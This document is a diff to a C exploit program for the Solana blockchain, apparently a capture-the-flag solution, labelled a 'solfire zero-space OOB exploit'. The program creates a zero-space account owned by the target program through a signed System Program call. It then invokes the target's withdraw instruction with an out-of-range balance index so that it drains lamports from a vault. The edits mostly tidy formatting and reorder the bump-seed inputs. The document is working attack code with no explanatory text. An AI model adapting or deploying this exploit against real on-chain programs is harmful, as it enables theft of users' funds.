@@ -8,7 +8,7 @@ static SolParameters params;
 
 static void write_u32(uint8_t *out, uint32_t value)
 {
-    out[0] = (uint8_t)(value);
+    out[0] = (uint8_t)value;
     out[1] = (uint8_t)(value >> 8);
     out[2] = (uint8_t)(value >> 16);
     out[3] = (uint8_t)(value >> 24);
@@ -37,8 +37,8 @@ static uint64_t run(const uint8_t *input)
 
     /*
      * Accounts:
-     * 0 = clock
-     * 1 = system
+     * 0 = C1ock
+     * 1 = System Program
      * 2 = user
      * 3 = vault
      * 4 = solfire
@@ -46,10 +46,11 @@ static uint64_t run(const uint8_t *input)
      * 6 = balances PDA
      *
      * Input:
-     * 0 = balances PDA bump
-     * 1 = vault PDA bump
+     * 0 = solfire bump
+     * 1 = balances bump
+     * 2 = vault bump
      */
-    if (params.ka_num != 7 || params.data_len != 2) {
+    if (params.ka_num != 7 || params.data_len != 3) {
         return ERROR_INVALID_ARGUMENT;
     }
 
@@ -72,7 +73,11 @@ static uint64_t run(const uint8_t *input)
         (SolPubkey *)params.ka[6].key;
 
     /*
-     * Create a zero-data account owned by solfire.
+     * System Program CreateAccount:
+     * instruction = 0
+     * lamports    = 1
+     * space       = 0
+     * owner       = solfire
      */
     uint8_t create_data[52];
 
@@ -82,20 +87,9 @@ static uint64_t run(const uint8_t *input)
         sizeof(create_data)
     );
 
-    write_u32(
-        create_data,
-        0
-    );
-
-    write_u64(
-        create_data + 4,
-        1
-    );
-
-    write_u64(
-        create_data + 12,
-        0
-    );
+    write_u32(create_data, 0);
+    write_u64(create_data + 4, 1);
+    write_u64(create_data + 12, 0);
 
     sol_memcpy(
         create_data + 20,
@@ -105,7 +99,7 @@ static uint64_t run(const uint8_t *input)
 
     SolAccountMeta create_metas[] = {
         { user_key,    1, 1 },
-        { balance_key, 1, 1 },
+        { balance_key, 1, 1 }
     };
 
     SolInstruction create_ix = {
@@ -113,24 +107,24 @@ static uint64_t run(const uint8_t *input)
         create_metas,
         2,
         create_data,
-        sizeof(create_data),
+        sizeof(create_data)
     };
 
     /*
-     * PDA seed = "A" + balances bump
+     * balances PDA = ["A"] + balances bump
      */
     uint8_t seed_data[] = {
         'A',
-        params.data[0]
+        params.data[1]
     };
 
     SolSignerSeed seed = {
         seed_data,
-        sizeof(seed_data),
+        sizeof(seed_data)
     };
 
     const SolSignerSeeds signers[] = {
-        { &seed, 1 },
+        { &seed, 1 }
     };
 
     uint64_t result = sol_invoke_signed(
@@ -147,7 +141,6 @@ static uint64_t run(const uint8_t *input)
 
     /*
      * Solfire withdraw:
-     *
      * opcode        = 2
      * balance_index = 640
      * lamports      = 50000
@@ -161,10 +154,7 @@ static uint64_t run(const uint8_t *input)
         sizeof(withdraw_data)
     );
 
-    write_u32(
-        withdraw_data,
-        2
-    );
+    write_u32(withdraw_data, 2);
 
     write_u32(
         withdraw_data + 4,
@@ -176,14 +166,14 @@ static uint64_t run(const uint8_t *input)
         TARGET_LAMPORTS
     );
 
-    withdraw_data[12] = params.data[1];
+    withdraw_data[12] = params.data[2];
 
     SolAccountMeta withdraw_metas[] = {
         { clock_key,   0, 0 },
         { system_key,  0, 0 },
         { balance_key, 0, 1 },
         { user_key,    1, 1 },
-        { vault_key,   0, 1 },
+        { vault_key,   0, 1 }
     };
 
     SolInstruction withdraw_ix = {
@@ -191,7 +181,7 @@ static uint64_t run(const uint8_t *input)
         withdraw_metas,
         5,
         withdraw_data,
-        sizeof(withdraw_data),
+        sizeof(withdraw_data)
     };
 
     return sol_invoke(
@@ -203,9 +193,6 @@ static uint64_t run(const uint8_t *input)
 
 extern uint64_t entrypoint(const uint8_t *input)
 {
-    sol_log(
-        "solfire zero-space OOB exploit"
-    );
-
+    sol_log("solfire zero-space OOB exploit");
     return run(input);
 }
